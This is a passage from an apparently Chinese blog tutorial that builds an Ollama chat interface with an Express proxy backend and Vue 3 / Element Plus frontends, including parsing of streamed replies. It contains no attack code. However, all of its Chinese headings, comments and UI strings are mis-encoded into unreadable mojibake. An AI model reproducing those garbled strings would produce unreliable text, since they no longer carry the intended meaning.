class="property">models</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;è·å–æ¨¡å‹åˆ—è¡¨å¤±è´¥&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘é€å¯¹è¯è¯·æ±‚</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/chat&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; model, message &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!model || !message) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;ç¼ºå°‘æ¨¡å‹æˆ–æ¶ˆæ¯å‚æ•°&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">post</span>(<span class="string">`<span class="subst">$&#123;OLLAMA_URL&#125;</span>/api/generate`</span>, &#123;</span><br><span class="line">            model,</span><br><span class="line">            <span class="attr">prompt</span>: message</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        res.<span class="title function_">json</span>(response.<span class="property">data</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;å¯¹è¯è¯·æ±‚å¤±è´¥&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running at http://localhost:<span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="å‰ç«¯ï¼ˆVue-3-Element-Plusï¼‰"><a href="#å‰ç«¯ï¼ˆVue-3-Element-Plusï¼‰" class="headerlink" title="å‰ç«¯ï¼ˆVue 3 + Element Plusï¼‰"></a>å‰ç«¯ï¼ˆVue 3 + Element Plusï¼‰</h2><p>å®‰è£… Vue 3 é¡¹ç›®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">npm create vue@latest ollama-chat</span><br><span class="line"><span class="built_in">cd</span> ollama-chat</span><br><span class="line">npm install axios element-plus</span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ src&#x2F;App.vueï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123; ref, onMounted &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&quot;axios&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123; <span class="title class_">ElMessage</span> &#125; <span class="keyword">from</span> <span class="string">&quot;element-plus&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> models = <span class="title function_">ref</span>([]);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> selectedModel = <span class="title function_">ref</span>(<span class="string">&quot;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> userInput = <span class="title function_">ref</span>(<span class="string">&quot;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> chatHistory = <span class="title function_">ref</span>([]);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> <span class="title function_">fetchModels</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&quot;http://localhost:3000/api/models&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        models.<span class="property">value</span> = response.<span class="property">data</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (models.<span class="property">value</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            selectedModel.<span class="property">value</span> = models.<span class="property">value</span>[<span class="number">0</span>].<span class="property">name</span>; <span class="comment">// é»˜è®¤é€‰ç¬¬ä¸€ä¸ª</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">ElMessage</span>.<span class="title function_">error</span>(<span class="string">&quot;æ— æ³•è·å–æ¨¡å‹åˆ—è¡¨&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> <span class="title function_">sendMessage</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (!userInput.<span class="property">value</span>.<span class="title function_">trim</span>()) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">ElMessage</span>.<span class="title function_">warning</span>(<span class="string">&quot;è¯·è¾“å…¥å†…å®¹&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (!selectedModel.<span class="property">value</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">ElMessage</span>.<span class="title function_">warning</span>(<span class="string">&quot;è¯·é€‰æ‹©æ¨¡å‹&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> userMessage = &#123; <span class="attr">role</span>: <span class="string">&quot;user&quot;</span>, <span class="attr">content</span>: userInput.<span class="property">value</span> &#125;;</span></span><br><span class="line"><span class="language-javascript">    chatHistory.<span class="property">value</span>.<span class="title function_">push</span>(userMessage);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">post</span>(<span class="string">&quot;http://localhost:3000/api/chat&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">model</span>: selectedModel.<span class="property">value</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: userInput.<span class="property">value</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        chatHistory.<span class="property">value</span>.<span class="title function_">push</span>(&#123; <span class="attr">role</span>: <span class="string">&quot;assistant&quot;</span>, <span class="attr">content</span>: response.<span class="property">data</span>.<span class="property">response</span> &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">ElMessage</span>.<span class="title function_">error</span>(<span class="string">&quot;è¯·æ±‚å¤±è´¥&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    userInput.<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">onMounted</span>(fetchModels);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;max-width: 600px; margin: auto; padding: 20px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-select</span> <span class="attr">v-model</span>=<span class="string">&quot;selectedModel&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;é€‰æ‹©æ¨¡å‹&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100%; margin-bottom: 10px&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-option</span> <span class="attr">v-for</span>=<span class="string">&quot;model in models&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;model.name&quot;</span> <span class="attr">:label</span>=<span class="string">&quot;model.name&quot;</span> <span class="attr">:value</span>=<span class="string">&quot;model.name&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">el-select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">&quot;(msg, index) in chatHistory&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123; textAlign: msg.role === &#x27;user&#x27; ? &#x27;right&#x27; : &#x27;left&#x27; &#125;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-card</span> <span class="attr">shadow</span>=<span class="string">&quot;never&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin: 5px 0&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">strong</span>&gt;</span>&#123;&#123; msg.role === &quot;user&quot; ? &quot;ï¼š&quot; : &quot;Ollamaï¼š&quot; &#125;&#125;<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> &#123;&#123; msg.content &#125;&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">el-card</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">&quot;userInput&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;è¾“å…¥æ¶ˆæ¯...&quot;</span> @<span class="attr">keyup.enter</span>=<span class="string">&quot;sendMessage&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;sendMessage&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100%; margin-top: 10px&quot;</span>&gt;</span>å‘é€<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.el-card</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="è¿è¡Œé¡¹ç›®"><a href="#è¿è¡Œé¡¹ç›®" class="headerlink" title="è¿è¡Œé¡¹ç›®"></a>è¿è¡Œé¡¹ç›®</h2><p>è¿è¡Œåç«¯ï¼š<br>node server.js<br>è¿è¡Œå‰ç«¯ï¼š<br>npm run dev</p><p>æ‰“å¼€æµè§ˆå™¨è®¿é—® Vue å¼€å‘æœåŠ¡å™¨ï¼ˆä¸€èˆ¬æ˜¯ <a href="http://localhost:5173ï¼‰ã€‚">http://localhost:5173ï¼‰ã€‚</a><br><strong>åŠŸèƒ½è¯´æ˜</strong><br>âœ… æ¨¡å‹é€‰æ‹©ï¼šå‰ç«¯è¯·æ±‚ <a class="link"   href="http://1.1.1.1:11434/api/tags" >http://1.1.1.1:11434/api/tags<i class="fas fa-external-link-alt"></i></a> è·å–å¯ç”¨çš„ Ollama æ¨¡å‹åˆ—è¡¨ã€‚<br>âœ… å¯¹è¯åŠŸèƒ½ï¼šè¾“å…¥æ¶ˆæ¯åï¼Œå‰ç«¯å‘é€åˆ°åç«¯ï¼Œåç«¯è¯·æ±‚ Ollama è¿›è¡Œç”Ÿæˆï¼Œå¹¶è¿”å›å›å¤ã€‚<br>âœ… å†å²è®°å½•ï¼šæ˜¾ç¤ºç”¨æˆ·å’Œ AI çš„å¯¹è¯å†…å®¹ã€‚<br>âœ… ç®€å• UIï¼šä½¿ç”¨ Vue 3 å’Œ Element Plus æ„å»ºç•Œé¢ï¼Œæ”¯æŒå¿«æ·é”® Enter å‘é€æ¶ˆæ¯ã€‚</p><p>è¿™ä¸ªç¤ºä¾‹å¯ä»¥ç›´æ¥ç”¨äºå’Œ Ollama äº¤äº’ï¼Œå¹¶æ”¯æŒä¸åŒçš„ LLM æ¨¡å‹é€‰æ‹© ğŸš€</p><h1 id="è§£æ-Ollama-æµå¼å“åº”ï¼Œæ˜¾ç¤ºå¯¹è¯å†…å®¹ã€‚"><a href="#è§£æ-Ollama-æµå¼å“åº”ï¼Œæ˜¾ç¤ºå¯¹è¯å†…å®¹ã€‚" class="headerlink" title="è§£æ Ollama æµå¼å“åº”ï¼Œæ˜¾ç¤ºå¯¹è¯å†…å®¹ã€‚"></a>è§£æ Ollama æµå¼å“åº”ï¼Œæ˜¾ç¤ºå¯¹è¯å†…å®¹ã€‚</h1><p>å‰ç«¯è°ƒæ•´</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Ollama Chat<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;model-select&quot;</span>&gt;</span>é€‰æ‹©æ¨¡å‹:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;model-select&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;selectedModel&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">option</span> <span class="attr">v-for</span>=<span class="string">&quot;model in models&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;model.name&quot;</span> <span class="attr">:value</span>=<span class="string">&quot;model.name&quot;</span>&gt;</span></span><br><span class="line">            &#123;&#123; model.name &#125;&#125;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">v-model</span>=<span class="string">&quot;userInput&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;è¾“å…¥çš„æ¶ˆæ¯...&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sendMessage&quot;</span>&gt;</span>å‘é€<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>å¯¹è¯å†…å®¹:<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pre</span>&gt;</span>&#123;&#123; conversation &#125;&#125;<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">models</span>: [], <span class="comment">// æ¨¡å‹åˆ—è¡¨</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">selectedModel</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// å½“å‰é€‰ä¸­çš„æ¨¡å‹</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">userInput</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// ç”¨æˆ·è¾“å…¥çš„æ¶ˆæ¯</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">conversation</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// å¯¹è¯å†…å®¹</span></span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">async</span> <span class="title function_">created</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// é¡µé¢åŠ è½½æ—¶è·å–æ¨¡å‹åˆ—è¡¨</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">fetchModels</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// è·å–æ¨¡å‹åˆ—è¡¨</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">async</span> <span class="title function_">fetchModels</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;https://eog9l2jl-cig0n4bq-ferbg20o9l88.vcc4.mcprev.cn/api/models&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">models</span> = response.<span class="property">data</span>;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">models</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">selectedModel</span> = <span class="variable language_">this</span>.<span class="property">models</span>[<span class="number">0</span>].<span class="property">name</span>; <span class="comment">// é»˜è®¤é€‰æ‹©ç¬¬ä¸€ä¸ªæ¨¡å‹</span></span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;è·å–æ¨¡å‹åˆ—è¡¨å¤±è´¥:&#x27;</span>, error);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// å‘é€æ¶ˆæ¯</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">async</span> <span class="title function_">sendMessage</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">userInput</span>.<span class="title function_">trim</span>()) <span class="keyword">return</span>; <span class="comment">// å¦‚æœè¾“å…¥ä¸ºç©ºï¼Œç›´æ¥è¿”å›</span></span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> message = <span class="variable language_">this</span>.<span class="property">userInput</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">conversation</span> += <span class="string">`ç”¨æˆ·: <span class="subst">$&#123;message&#125;</span>\n`</span>; <span class="comment">// å°†ç”¨æˆ·è¾“å…¥æ·»åŠ åˆ°å¯¹è¯å†…å®¹</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">userInput</span> = <span class="string">&#x27;&#x27;</span>; <span class="comment">// æ¸…ç©ºè¾“å…¥æ¡†</span></span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">post</span>(<span class="string">&#x27;https://eog9l2jl-cig0n4bq-ferbg20o9l88.vcc4.mcprev.cn/api/chat&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">model</span>: <span class="variable language_">this</span>.<span class="property">selectedModel</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: message,</span></span><br><span class="line"><span class="language-javascript">          &#125;);</span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">          <span class="comment">// è§£ææµå¼è¿”å›çš„æ•°æ®</span></span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">const</span> rawData = response.<span class="property">data</span>.<span class="title function_">split</span>(<span class="string">&#x27;\n&#x27;</span>); <span class="comment">// æŒ‰è¡Œæ‹†åˆ† JSON</span></span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">let</span> aiResponse = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">          rawData.<span class="title function_">forEach</span>(<span class="function"><span class="params">line</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (line.<span class="title function_">trim</span>()) &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> parsed = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(line);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (parsed.<span class="property">response</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                  aiResponse += parsed.<span class="property">response</span>; <span class="comment">// æ‹¼æ¥ AI å›å¤</span></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">              &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;JSON è§£æå¤±è´¥:&#x27;</span>, error);</span></span><br><span class="line"><span class="language-javascript">              &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">          &#125;);</span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">          <span class="comment">// æ›´æ–°å¯¹è¯å†…å®¹</span></span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">conversation</span> += <span class="string">`AI: <span class="subst">$&#123;aiResponse&#125;</span>\n`</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;å‘é€æ¶ˆæ¯å¤±è´¥:&#x27;</span>, error);</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">conversation</span> += <span class="string">`AI: è¯·æ±‚å¤±è´¥ï¼Œè¯·ç¨åé‡è¯•ã€‚\n`</span>;</span></span><br><span class="line"><span 